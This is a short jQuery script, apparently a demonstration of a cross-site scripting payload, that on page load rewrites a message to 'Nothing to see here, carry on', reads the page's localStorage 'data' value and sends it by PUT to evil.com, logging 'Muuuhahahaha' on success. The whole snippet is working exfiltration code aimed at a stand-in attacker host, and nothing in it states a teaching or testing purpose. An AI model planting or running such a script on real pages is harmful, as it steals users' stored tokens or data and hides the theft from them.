

$(document).ready(function(){
  $("#message").html("Nothing to see here, carry on").removeClass().addClass("alert alert-danger");

  console.log('JSON: { "data": "' + localStorage.getItem('data') + '"}')
  jQuery.ajax({
   url: "https://www.evil.com:3000/local-storage/yummy",
   data: JSON.stringify({ data: localStorage.getItem('data')}),
   method: 'PUT',
   dataType: 'json',
   contentType: "application/json",
   success: function(data) {
     console.log("Muuuhahahaha");
   },
   error: function(data) {
     console.log("Too bad");
   }
  });
});
